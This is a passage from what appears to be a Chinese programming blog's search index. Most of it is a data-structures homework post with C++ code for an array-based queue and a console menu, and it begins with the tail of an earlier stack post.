Destroy(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>栈</tag>
        <tag>顺序表</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表队列</title>
    <url>/post/d1bf19f/</url>
    <content><![CDATA[<h1 id="顺序表队列"><a href="#顺序表队列" class="headerlink" title="顺序表队列"></a>顺序表队列</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OVERFLOW 2</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    node *elem;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"><span class="function">Status <span class="title">InitQueue</span><span class="params">(SqList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L.elem=<span class="keyword">new</span> node[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!L.elem)<span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">QueueShow</span><span class="params">(SqList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;L.elem[i].num&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">EnQueue</span><span class="params">(SqList &amp;L,node e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L.length==MAXSIZE)<span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[L.length]=e;</span><br><span class="line">        ++L.length;</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">DeQueue</span><span class="params">(SqList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">        L.elem[i<span class="number">-1</span>]=L.elem[i];</span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;1.EnQueue&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;2.DeQueue&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;0.Exit&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    node e;</span><br><span class="line">    <span class="keyword">int</span> a,n;</span><br><span class="line">    InitQueue(L);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">        menu();</span><br><span class="line">        QueueShow(L);</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span>(a==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Please Input Number To Be Insert:&quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;n;getchar();</span><br><span class="line">            e.num=n;</span><br><span class="line">            EnQueue(L,e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="number">2</span>)DeQueue(L);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>顺序表</tag>
        <tag>队列</tag>
      </tags>
  </entry>
</search>
